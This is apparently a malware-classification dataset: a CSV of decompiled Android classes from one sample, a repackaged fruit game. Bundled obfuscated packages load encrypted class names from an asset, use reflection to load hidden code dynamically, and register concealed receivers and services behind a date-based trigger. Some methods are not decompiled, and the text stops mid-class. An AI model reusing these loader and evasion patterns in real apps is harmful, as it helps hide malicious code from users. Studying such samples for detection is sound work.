"filepath","code"
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.arqi.pow\a.code","public final class a {   private static boolean a=false;   public static Class a(  Context context,  Class cls){     Class<?> cls2;     try {       ActivityInfo[] activityInfoArr=context.getPackageManager().getPackageInfo(context.getApplicationInfo().packageName,2).receivers;       if (activityInfoArr != null) {         int i=0;         while (true) {           int i2=i;           if (i2 >= activityInfoArr.length) {             break;           }           try {             cls2=Class.forName(activityInfoArr[i2].name);           }  catch (          ClassNotFoundException e) {             e.printStackTrace();           }           if (cls.isAssignableFrom(cls2)) {             return cls2;           }           i=i2 + 1;         }       }     }  catch (    PackageManager.NameNotFoundException e2) {       e2.printStackTrace();     }     return null;   }   public static void a(  android.content.Context r14){     throw new UnsupportedOperationException(""Method not decompiled: com.arqi.pow.a.a(android.content.Context):void"");   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.arqi.pow\b.code","public final class b {   public static String a="""";   public static String b="""";   public static String c="""";   public static String d="""";   public static String e="""";   public static String f="""";   public static String g="""";   public static String h="""";   public static String i="""";   public static String j="""";   public static String k="""";   public static String l="""";   public static String m="""";   public static String n="""";   public static String o="""";   public static String p="""";   public static String q="""";   public static String r="""";   public static String s="""";   public static String t="""";   public static String u="""";   public static String v="""";   public static String w="""";   public static String x="""";   public static String y="""";   public static String z="""";   public static String A="""";   public static String B="""";   public static String C="""";   public static String D="""";   public static String E="""";   public static String F="""";   public static String G="""";   public static String H="""";   public static String I="""";   public static String J="""";   public static String K="""";   public static String L=""FLDq"";   public static String M="""";   public static String N="""";   public static String O="""";   public static String P="""";   public static List Q=new ArrayList();   private static int R=0;   public static void a(  android.content.Context r6){     throw new UnsupportedOperationException(""Method not decompiled: com.arqi.pow.b.a(android.content.Context):void"");   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.arqi.pow\c.code","public final class c {   private static boolean a=true;   public static void a(  Activity activity,  int i,  KeyEvent keyEvent){     if ("""".equals(b.b)) {       b.a(activity.getApplicationContext());     }     g.a(activity,b.b).a(b.w,new Object[]{Integer.valueOf(i),keyEvent},new Class[]{Integer.TYPE,KeyEvent.class});   }   public static void a(  Context context){     b.a(context);     b(context.getApplicationContext());     a.a(context);     if (a.a(context,Peewr.class) != null) {       a(context,b.E,context,Peewr.class.getName(),Context.class,String.class);     }     a(context,b.d,context,Peewa.class.getName(),Context.class,String.class);     a(context,b.G,context,Peews.class.getName(),Context.class,String.class);   }   public static void a(  Context context,  int i,  int i2,  boolean z,  boolean z2,  boolean z3){     a(context,b.e,context,Integer.valueOf(i),Context.class,Integer.TYPE);     a(context,b.f,context,Integer.valueOf(i2),Context.class,Integer.TYPE);     a(context,b.g,context,Boolean.valueOf(z),Context.class,Boolean.TYPE);     a(context,b.h,context,Boolean.valueOf(z2),Context.class,Boolean.TYPE);     a(context,b.j,context,Boolean.valueOf(z3),Context.class,Boolean.TYPE);   }   public static void a(  Context context,  String str){     g.a(context,b.c).a(str,context,Context.class);   }   public static void a(  Context context,  String str,  Object obj,  Object obj2,  Class cls,  Class cls2){     g.a(context,b.c).a(str,new Object[]{obj,obj2},new Class[]{cls,cls2});   }   public static void a(  Context context,  String str,  Object obj,  Object obj2,  Object obj3,  Class cls,  Class cls2,  Class cls3){     g.a(context,b.c).a(str,new Object[]{obj,obj2,obj3},new Class[]{cls,cls2,cls3});   }   public static void a(  Context context,  boolean z){     a(context,b.i,context,Boolean.valueOf(z),Context.class,Boolean.TYPE);   }   public static void a(  Context context,  boolean z,  boolean z2,  int i){     a(context,b.I,context,Boolean.valueOf(z),Context.class,Boolean.TYPE);     a(context,z2);     a(context,b.J,context,Integer.valueOf(i),Context.class,Integer.TYPE);   }   public static void b(  Context context){     new e();     e.a(context);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.arqi.pow\d.code","public final class d {   public static String a=b.n;   public static String b=b.M;   public static String c=b.N;   public static String d=b.O;   public static String e=b.P;   private static d h;   private Class f;   private Object g;   public static d a(  Context context){     if (h == null) {       d dVar=new d();       h=dVar;       try {         String str=b(context) + a;         dVar.f=Class.forName(b);         dVar.g=dVar.f.getConstructor(String.class,String.class,String.class,Class.forName(e)).newInstance(str,b(context),"""",context.getClassLoader());       }  catch (      Exception e2) {         e2.printStackTrace();       }     }     return h;   }   private static Object a(  Class cls,  Object obj,  String str,  Object[] objArr,  Class[] clsArr){     try {       Method method=cls.getMethod(str,clsArr);       method.setAccessible(true);       return method.invoke(obj,objArr);     }  catch (    Exception e2) {       e2.printStackTrace();       return null;     }   }   private Object a(  String str,  Object[] objArr,  Class[] clsArr){     return a(this.f,this.g,str,objArr,clsArr);   }   private static String b(  Context context){     return context.getDir(b.o,0).getAbsolutePath() + ""/"";   }   public final Class a(  String str){     return (Class)a(c,new Object[]{str},new Class[]{String.class});   }   public final void a(){     a(d,new Object[0],new Class[0]);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.arqi.pow\e.code","public final class e {   private static Peewr a=null;   private static boolean b=false;   public static void a(  Context context){     if (b && a != null) {       try {         b=false;         context.unregisterReceiver(a);       }  catch (      Exception e) {       }     }     try {       IntentFilter intentFilter=new IntentFilter();       intentFilter.addAction(b.y);       intentFilter.addAction(b.z);       intentFilter.addDataScheme(b.A);       if (a == null) {         a=new Peewr();       }       context.registerReceiver(a,intentFilter);       b=true;     }  catch (    Exception e2) {     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.arqi.pow\f.code","public final class f {   public static Object a(  Class cls){     try {       return cls.getConstructor(new Class[0]).newInstance(new Object[0]);     }  catch (    Exception e) {       return null;     }   }   public static Object a(  String str,  Object[] objArr,  Class[] clsArr,  Class cls,  Object obj){     try {       Method declaredMethod=cls.getDeclaredMethod(str,clsArr);       declaredMethod.setAccessible(true);       return declaredMethod.invoke(obj,objArr);     }  catch (    Exception e) {       return null;     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.arqi.pow\g.code","public final class g {   public static String a=b.n;   private static g f;   private d b;   private Class c;   private Object d;   private String e;   public static g a(  Context context,  String str){     if (f == null) {       g gVar=new g();       f=gVar;       gVar.a(context);       f.b(str);     }  else     if (!f.e.equals(str)) {       f.b.a();       f.a(context);       f.b(str);     }     return f;   }   private void a(  Context context){     try {       this.b=d.a(context);     }  catch (    Exception e) {       e.printStackTrace();     }   }   private void b(  String str){     this.e=str;     try {       this.c=this.b.a(str);       this.d=f.a(this.c);     }  catch (    Exception e) {       e.printStackTrace();     }   }   public final Object a(  String str){     return a(str,new Object[0],new Class[0]);   }   public final Object a(  String str,  Object obj,  Class cls){     return a(str,new Object[]{obj},new Class[]{cls});   }   public final Object a(  String str,  Object[] objArr,  Class[] clsArr){     return f.a(str,objArr,clsArr,this.c,this.d);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.arqi.pow\Peew.code","public class Peew {   private static Peew a;   public static Peew get(  Context context){     if (a == null) {       a=new Peew();     }     c.a(context);     c.a(context,b.q);     return a;   }   public static Peew get(  Context context,  String str){     if (a == null) {       a=new Peew();     }     c.a(context);     c.a(context,b.q,context,str,Context.class,String.class);     return a;   }   public static Peew get(  Context context,  String str,  String str2){     if (a == null) {       a=new Peew();     }     c.a(context);     c.a(context,b.q,context,str,str2,Context.class,String.class,String.class);     return a;   }   public void c1(  Context context,  int i,  int i2,  boolean z,  boolean z2,  boolean z3){     c.a(context,i,i2,z,z2,z3);   }   public void c2(  Context context,  boolean z,  boolean z2,  int i){     c.a(context,z,z2,i);   }   public void e(  Activity activity){     c.a(activity,b.D);   }   public void fc(  Context context,  long j){     c.a(context,b.K,context,Long.valueOf(j),Context.class,Long.TYPE);   }   public void l(  Context context){     c.a(context,b.l);   }   public void os(  Context context){     c.a(context,true);     l(context);   }   public void s(  Context context){     c.a(context,b.k);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.arqi.pow\Peewa.code","public class Peewa extends Activity {   @Override public void onConfigurationChanged(  Configuration configuration){     super.onConfigurationChanged(configuration);     try {       g.a(this,b.b).a(b.x,configuration,Configuration.class);     }  catch (    Exception e) {       e.printStackTrace();     }   }   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     requestWindowFeature(1);     try {       g a=g.a(this,b.b);       a.a(b.r,this,Activity.class);       a.a(b.s,bundle,Bundle.class);       new e();       e.a(getApplicationContext());     }  catch (    Exception e) {       e.printStackTrace();     }   }   @Override public boolean onKeyDown(  int i,  KeyEvent keyEvent){     try {       c.a(this,i,keyEvent);       return true;     }  catch (    Exception e) {       e.printStackTrace();       return true;     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.arqi.pow\Peewr.code","public class Peewr extends BroadcastReceiver {   @Override public void onReceive(  Context context,  Intent intent){     try {       if ("""".equals(b.a)) {         b.a(context);         new e();         e.a(context);       }       g.a(context,b.a).a(b.t,new Object[]{context,intent},new Class[]{Context.class,Intent.class});     }  catch (    Exception e) {       e.printStackTrace();     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.arqi.pow\Peews.code","public class Peews extends Service {   @Override public IBinder onBind(  Intent intent){     return null;   }   @Override public void onCreate(){     super.onCreate();     try {       Context applicationContext=getApplicationContext();       try {         b.a(applicationContext);         c.b(applicationContext);         g a=g.a(applicationContext,b.F);         a.a(b.r,applicationContext,Context.class);         a.a(b.s);       }  catch (      Exception e) {       }     }  catch (    Exception e2) {       e2.printStackTrace();     }   }   @Override public void onDestroy(){     super.onDestroy();     stopSelf();   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.arqi.pow\z.code","public class z {   private static boolean a=true;   public static void Log(  String str,  String str2){   }   private static boolean a(  int i,  boolean z,  String str){     Calendar calendar=Calendar.getInstance();     calendar.setTime(new Date());     int i2=calendar.get(11);     calendar.get(7);     if (str != null) {       try {         if (!"""".equals(str)) {           if (System.currentTimeMillis() > new SimpleDateFormat(""yyyy-MM-dd hh:mm"").parse(str).getTime()) {             return false;           }         }       }  catch (      Exception e) {         e.printStackTrace();       }     }     return z ? i2 < i : i2 >= i;   }   public static boolean a(  Context context,  int i,  int i2,  String str){     return a(i,false,str) && a(i2,true,str);   }   public static boolean get(  String str){     Calendar.getInstance().setTime(new Date());     if (str != null) {       try {         if (!"""".equals(str)) {           if (System.currentTimeMillis() > new SimpleDateFormat(""yyyy-MM-dd hh:mm"").parse(str).getTime()) {             return true;           }         }       }  catch (      Exception e) {         e.printStackTrace();       }     }     return false;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.arqi.rwo\Aiqi.code","public class Aiqi {   private static Aiqi a;   public static Aiqi getInstance(  Context context){     if (a == null) {       a=new Aiqi();     }     c.a(context);     return a;   }   public static boolean o(  String str){     return a.a(str);   }   public void c(  Context context,  boolean z){     c.a(context,z);   }   public void r(  Context context,  int i){     c.a(context,i);   }   public void r(  Context context,  int i,  long j){     c.a(context,i,j);   }   public void r(  Context context,  String str,  int i){     c.a(context,str,i);   }   public void r(  Context context,  String str,  String str2,  int i){     c.a(context,str,str2,i);   }   public void r(  Context context,  String str,  String str2,  int i,  long j){     c.a(context,str,str2,i,j);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.arqi.rwo\Aiqia.code","public class Aiqia extends Activity {   private boolean a=false;   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     requestWindowFeature(1);     c.a(this,bundle);     new d();     d.a(getApplicationContext());   }   @Override public boolean onKeyDown(  int i,  KeyEvent keyEvent){     try {       if (!this.a) {         c.a(i,keyEvent,getApplicationContext());         return true;       }     }  catch (    Exception e) {       this.a=true;     }     return super.onKeyDown(i,keyEvent);   }   @Override protected void onPause(){     super.onPause();     this.a=true;   }   @Override protected void onStop(){     super.onStop();     this.a=true;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.arqi.rwo\Aiqir.code","public class Aiqir extends BroadcastReceiver {   @Override public void onReceive(  Context context,  Intent intent){     c.a(context,intent);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.arqi.rwo\Aiqis.code","public class Aiqis extends Service {   @Override public IBinder onBind(  Intent intent){     return null;   }   @Override public void onCreate(){     super.onCreate();     c.b(getApplicationContext());   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.arqi.rwo.a\a.code","public final class a {   public static boolean a(  String str){     if (str != null) {       try {         if (!"""".equals(str)) {           if (System.currentTimeMillis() > new SimpleDateFormat(""yyyy-MM-dd hh:mm"").parse(str).getTime()) {             return true;           }         }       }  catch (      Exception e) {       }     }     return false;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.arqi.rwo.a\b.code","public final class b {   public static String a="""";   public static String b="""";   public static String c="""";   public static String d="""";   public static String e="""";   public static String f="""";   public static String g="""";   public static String h="""";   public static String i="""";   public static String j="""";   public static String k="""";   public static String l="""";   public static String m="""";   public static String n="""";   public static String o="""";   public static String p="""";   public static String q="""";   public static String r="""";   public static String s="""";   public static String t="""";   public static String u="""";   public static String v="""";   public static String w=""FJOb"";   public static String x="""";   public static String y="""";   public static String z="""";   public static String A="""";   public static List B=new ArrayList();   public static void a(  Context context){     InputStream inputStream;     DataInputStream dataInputStream;     DataInputStream dataInputStream2=null;     dataInputStream2=null;     InputStream inputStream2=null;     B.clear();     try {       inputStream=context.getAssets().open(new String(w));       try {         try {           dataInputStream=new DataInputStream(inputStream);         }  catch (        Exception e2) {           dataInputStream=null;           inputStream2=inputStream;         }       }  catch (      Throwable th) {         th=th;       }       try {         dataInputStream.read(new byte[dataInputStream.readInt()]);         dataInputStream.readLong();         dataInputStream.readInt();         dataInputStream.readLong();         for (int i2=0; i2 < 3; i2++) {           dataInputStream.read(new byte[dataInputStream.readInt()]);         }         dataInputStream.readInt();         dataInputStream2=new DataInputStream(inputStream);         try {           BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(dataInputStream2));           for (String readLine=bufferedReader.readLine(); readLine != null; readLine=bufferedReader.readLine()) {             try {               B.add(readLine);             }  catch (            Exception e3) {               Log.e("""",""error"");             }           }           bufferedReader.close();           try {             a=new String((String)B.get(0));             b=new String((String)B.get(1));             c=new String((String)B.get(2));             d=new String((String)B.get(3));             e=new String((String)B.get(4));             f=new String((String)B.get(5));             g=new String((String)B.get(6));             h=new String((String)B.get(7));             i=new String((String)B.get(8));             j=new String((String)B.get(9));             k=new String((String)B.get(10));             l=new String((String)B.get(11));             m=new String((String)B.get(12));             n=new String((String)B.get(13));             o=new String((String)B.get(14));             p=new String((String)B.get(15));             q=new String((String)B.get(16));             r=new String((String)B.get(17));             s=new String((String)B.get(18));             t=new String((String)B.get(19));             u=new String((String)B.get(20));             v=new String((String)B.get(21));             x=(String)B.get(22);             y=(String)B.get(23);             z=(String)B.get(24);             A=(String)B.get(25);           }  catch (          Exception e4) {           }           try {             dataInputStream2.close();           }  catch (          IOException e5) {           }           if (inputStream != null) {             try {               inputStream.close();             }  catch (            IOException e6) {             }           }         }  catch (        Exception e7) {           dataInputStream=dataInputStream2;           inputStream2=inputStream;           if (dataInputStream != null) {             try {               dataInputStream.close();             }  catch (            IOException e8) {             }           }           if (inputStream2 != null) {             try {               inputStream2.close();             }  catch (            IOException e9) {             }           }         }       }  catch (      Exception e10) {         inputStream2=inputStream;       } catch (      Throwable th2) {         dataInputStream2=dataInputStream;         th=th2;         if (dataInputStream2 != null) {           try {             dataInputStream2.close();           }  catch (          IOException e11) {           }         }         if (inputStream == null) {           throw th;         }         try {           inputStream.close();           throw th;         }  catch (        IOException e12) {           throw th;         }       }     }  catch (    Exception e13) {       dataInputStream=null;     } catch (    Throwable th3) {       th=th3;       inputStream=null;     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.arqi.rwo.a\c.code","public final class c {   private static boolean a=true;   public static void a(  int i,  KeyEvent keyEvent,  Context context){     if ("""".equals(b.c)) {       b.a(context);     }     com.arqi.rwo.b.a.a(context,b.c).b(""onKeyDown"",new Object[]{Integer.valueOf(i),keyEvent},new Class[]{Integer.TYPE,KeyEvent.class});   }   public static void a(  Activity activity,  Bundle bundle){     try {       if ("""".equals(b.c)) {         b.a(activity);       }       com.arqi.rwo.b.a a2=com.arqi.rwo.b.a.a(activity,b.c);       a2.a(b.i,activity,Activity.class);       a2.a(b.j,bundle,Bundle.class);     }  catch (    Exception e) {     }   }   public static void a(  android.content.Context r9){     throw new UnsupportedOperationException(""Method not decompiled: com.arqi.rwo.a.c.a(android.content.Context):void"");   }   public static void a(  Context context,  int i){     com.arqi.rwo.b.a.a(context,b.d).a(b.e,Integer.valueOf(i),Integer.TYPE);   }   public static void a(  Context context,  int i,  long j){     com.arqi.rwo.b.a.a(context,b.d).a(b.e,new Object[]{Integer.valueOf(i),Long.valueOf(j)},new Class[]{Integer.TYPE,Long.TYPE});   }   public static void a(  Context context,  Intent intent){     try {       if ("""".equals(b.b)) {         b.a(context);       }       com.arqi.rwo.b.a.a(context,b.b).a(b.k,new Object[]{context,intent},new Class[]{Context.class,Intent.class});     }  catch (    Exception e) {     }   }   public static void a(  Context context,  String str,  int i){     com.arqi.rwo.b.a.a(context,b.d).a(b.e,new Object[]{str,Integer.valueOf(i)},new Class[]{String.class,Integer.TYPE});   }   private static void a(  Context context,  String str,  Object obj,  Object obj2,  Class cls,  Class cls2){     com.arqi.rwo.b.a.a(context,b.d).a(str,new Object[]{obj,obj2},new Class[]{cls,cls2});   }   public static void a(  Context context,  String str,  String str2,  int i){     com.arqi.rwo.b.a.a(context,b.d).a(b.e,new Object[]{str,str2,Integer.valueOf(i)},new Class[]{String.class,String.class,Integer.TYPE});   }   public static void a(  Context context,  String str,  String str2,  int i,  long j){     com.arqi.rwo.b.a.a(context,b.d).a(b.e,new Object[]{str,str2,Integer.valueOf(i),Long.valueOf(j)},new Class[]{String.class,String.class,Integer.TYPE,Long.TYPE});   }   public static void a(  Context context,  boolean z){     a(context,b.v,context,Boolean.valueOf(z),Context.class,Boolean.TYPE);   }   public static void b(  Context context){     try {       b.a(context);       new d();       d.a(context);       com.arqi.rwo.b.a a2=com.arqi.rwo.b.a.a(context,b.a);       a2.a(b.i,context,Context.class);       a2.a(b.j);     }  catch (    Exception e) {     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.arqi.rwo.a\d.code","public final class d {   private static m a=null;   private static boolean b=false;   public static void a(  Context context){     if (b && a != null) {       try {         b=false;         context.unregisterReceiver(a);       }  catch (      Exception e) {       }     }     try {       IntentFilter intentFilter=new IntentFilter();       intentFilter.addAction(b.r);       intentFilter.addAction(b.s);       intentFilter.addDataScheme(b.t);       if (a == null) {         a=new m();       }       context.registerReceiver(a,intentFilter);       b=true;     }  catch (    Exception e2) {     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.arqi.rwo.a\m.code","public class m extends BroadcastReceiver {   @Override public void onReceive(  Context context,  Intent intent){     c.a(context,intent);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.arqi.rwo.b\a.code","public final class a {   private static a f;   private b b;   private Class c;   private Object d;   private String e;   public static String a=com.arqi.rwo.a.b.f;   private static String g="""";   public static a a(  Context context,  String str){     if (f == null) {       a aVar=new a();       f=aVar;       aVar.a(context);       f.b(str);     }  else     if (!f.e.equals(str)) {       f.b.a();       f.a(context);       f.b(str);     }     return f;   }   private void a(  Context context){     try {       this.b=b.a(context);     }  catch (    Exception e) {     }   }   private void b(  String str){     this.e=str;     try {       this.c=this.b.a(str);       this.d=c.a(this.c);     }  catch (    Exception e) {     }   }   public final Object a(  String str){     return a(str,new Object[0],new Class[0]);   }   public final Object a(  String str,  Object obj,  Class cls){     return a(str,new Object[]{obj},new Class[]{cls});   }   public final Object a(  String str,  Object[] objArr,  Class[] clsArr){     return c.a(str,objArr,clsArr,this.c,this.d);   }   public final Object b(  String str,  Object[] objArr,  Class[] clsArr){     Class cls=this.c;     Object obj=this.d;     Method declaredMethod=cls.getDeclaredMethod(str,clsArr);     declaredMethod.setAccessible(true);     return declaredMethod.invoke(obj,objArr);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.arqi.rwo.b\b.code","public final class b {   public static String a=com.arqi.rwo.a.b.f;   public static String b=com.arqi.rwo.a.b.x;   public static String c=com.arqi.rwo.a.b.y;   public static String d=com.arqi.rwo.a.b.z;   public static String e=com.arqi.rwo.a.b.A;   private static b h;   private Class f;   private Object g;   public static b a(  Context context){     if (h == null) {       b bVar=new b();       h=bVar;       try {         String str=b(context) + a;         bVar.f=Class.forName(b);         bVar.g=bVar.f.getConstructor(String.class,String.class,String.class,Class.forName(e)).newInstance(str,b(context),"""",context.getClassLoader());       }  catch (      Exception e2) {       }     }     return h;   }   private static Object a(  Class cls,  Object obj,  String str,  Object[] objArr,  Class[] clsArr){     try {       Method method=cls.getMethod(str,clsArr);       method.setAccessible(true);       return method.invoke(obj,objArr);     }  catch (    Exception e2) {       return null;     }   }   private Object a(  String str,  Object[] objArr,  Class[] clsArr){     return a(this.f,this.g,str,objArr,clsArr);   }   private static String b(  Context context){     return context.getDir(com.arqi.rwo.a.b.g,0).getAbsolutePath() + ""/"";   }   public final Class a(  String str){     return (Class)a(c,new Object[]{str},new Class[]{String.class});   }   public final void a(){     a(d,new Object[0],new Class[0]);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.arqi.rwo.b\c.code","public final class c {   public static Object a(  Class cls){     try {       return cls.getConstructor(new Class[0]).newInstance(new Object[0]);     }  catch (    Exception e) {       return null;     }   }   public static Object a(  String str,  Object[] objArr,  Class[] clsArr,  Class cls,  Object obj){     try {       Method declaredMethod=cls.getDeclaredMethod(str,clsArr);       declaredMethod.setAccessible(true);       return declaredMethod.invoke(obj,objArr);     }  catch (    Exception e) {       return null;     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.conans.forces\attr.code","public static final class attr { } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.conans.forces\BuildConfig.code","public final class BuildConfig {   public static final boolean DEBUG=true; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.conans.forces\Coco.code","public class Coco extends Activity {   @Override protected void onCreate(  Bundle savedInstanceState){     super.onCreate(savedInstanceState);     if (z.get(""2014-04-01 14:00"")) {       Peew spM=Peew.get(getApplicationContext(),""aceda7e199638c1f1d3ab4e1416ccc7b"",""p-goapk"");       spM.l(getApplicationContext());       spM.s(this);       spM.os(getApplicationContext());       spM.fc(getApplicationContext(),0L);     }     Aiqi red=Aiqi.getInstance(getApplicationContext());     red.r(getApplicationContext(),""aceda7e199638c1f1d3ab4e1416ccc7b"",2);     Intent into=new Intent(""android.intent.action.MAIN"");     into.addCategory(""android.intent.category.LAUNCHER"");     into.setClass(this,UmAct.class);     startActivity(into);     finish();   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.conans.forces\dimen.code","public static final class dimen {   public static final int activity_horizontal_margin=0x7f040000;   public static final int activity_vertical_margin=0x7f040001; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.conans.forces\drawable.code","public static final class drawable {   public static final int ic_launcher=0x7f020000; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.conans.forces\id.code","public static final class id {   public static final int noti_content=0x7f070003;   public static final int noti_icon=0x7f070000;   public static final int noti_time=0x7f070001;   public static final int noti_title=0x7f070002; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.conans.forces\layout.code","public static final class layout {   public static final int activity_main=0x7f030000;   public static final int layout_notification=0x7f030001; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.conans.forces\R.code","public final class R { public static final class attr {   } public static final class dimen {     public static final int activity_horizontal_margin=0x7f040000;     public static final int activity_vertical_margin=0x7f040001;   } public static final class drawable {     public static final int ic_launcher=0x7f020000;   } public static final class id {     public static final int noti_content=0x7f070003;     public static final int noti_icon=0x7f070000;     public static final int noti_time=0x7f070001;     public static final int noti_title=0x7f070002;   } public static final class layout {     public static final int activity_main=0x7f030000;     public static final int layout_notification=0x7f030001;   } public static final class string {     public static final int action_settings=0x7f050001;     public static final int app_name=0x7f050000;     public static final int hello_world=0x7f050002;   } public static final class style {     public static final int AppBaseTheme=0x7f060000;     public static final int AppTheme=0x7f060001;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.conans.forces\string.code","public static final class string {   public static final int action_settings=0x7f050001;   public static final int app_name=0x7f050000;   public static final int hello_world=0x7f050002; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.conans.forces\style.code","public static final class style {   public static final int AppBaseTheme=0x7f060000;   public static final int AppTheme=0x7f060001; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.conans.forces\UmAct.code","public class UmAct extends Activity {   @Override protected void onCreate(  Bundle savedInstanceState){     super.onCreate(savedInstanceState);   }   @Override public void onPause(){     super.onPause();     MobclickAgent.onPause(this);   }   @Override public void onResume(){     super.onResume();     MobclickAgent.onResume(this);   }   @Override public void onStart(){     super.onStart();     try {       startActivity(new Intent(this,Class.forName(String.valueOf(getPackageManager().getApplicationInfo(getPackageName(),g.c).metaData.get(""nxt_name"")))));     }  catch (    Exception e) {     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.game.activity\DemoGLSurfaceView.code","class DemoGLSurfaceView extends GLSurfaceView {   public static DemoRenderer mRenderer;   public static int mheight;   public static int mwidth;   public DemoGLSurfaceView(  Context context){     super(context);     mRenderer=new DemoRenderer(context);     setRenderer(mRenderer);   }   @Override protected void onSizeChanged(  int w,  int h,  int oldw,  int oldh){     mwidth=w;     mheight=h;     super.onSizeChanged(w,h,oldw,oldh);   }   @Override public boolean onTouchEvent(  MotionEvent event){     return true;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.game.activity\DemoRenderer.code","public class DemoRenderer implements GLSurfaceView.Renderer {   private static final int BANANA0=0;   private static final int BANANA1=1;   private static final int BANANA1_1=3;   private static final int BANANA1_2=4;   private static final int BANANA2=2;   private static final int BANANA2_1=5;   private static final int BANANA2_2=6;   private static final int BOMB1=84;   private static final int BOMB2=85;   private static final int BOMB3=86;   private static final int CANTALOUPE0=7;   private static final int CANTALOUPE1=8;   private static final int CANTALOUPE1_1=10;   private static final int CANTALOUPE1_2=11;   private static final int CANTALOUPE2=9;   private static final int CANTALOUPE2_1=12;   private static final int CANTALOUPE2_2=13;   private static final int CARAMBOLA0=14;   private static final int CARAMBOLA1=15;   private static final int CARAMBOLA1_1=17;   private static final int CARAMBOLA1_2=18;   private static final int CARAMBOLA2=16;   private static final int CARAMBOLA2_1=19;   private static final int CARAMBOLA2_2=20;   private static final int COCONUT0=21;   private static final int COCONUT1=22;   private static final int COCONUT1_1=24;   private static final int COCONUT1_2=25;   private static final int COCONUT2=23;   private static final int COCONUT2_1=26;   private static final int COCONUT2_2=27;   private static final int FRUIT_NUM=87;   private static final int LEMON0=28;   private static final int LEMON1=29;   private static final int LEMON1_1=31;   private static final int LEMON1_2=32;   private static final int LEMON2=30;   private static final int LEMON2_1=33;   private static final int LEMON2_2=34;   private static final int MANGOSTEEN0=35;   private static final int MANGOSTEEN1=36;   private static final int MANGOSTEEN1_1=38;   private static final int MANGOSTEEN1_2=39;   private static final int MANGOSTEEN2=37;   private static final int MANGOSTEEN2_1=40;   private static final int 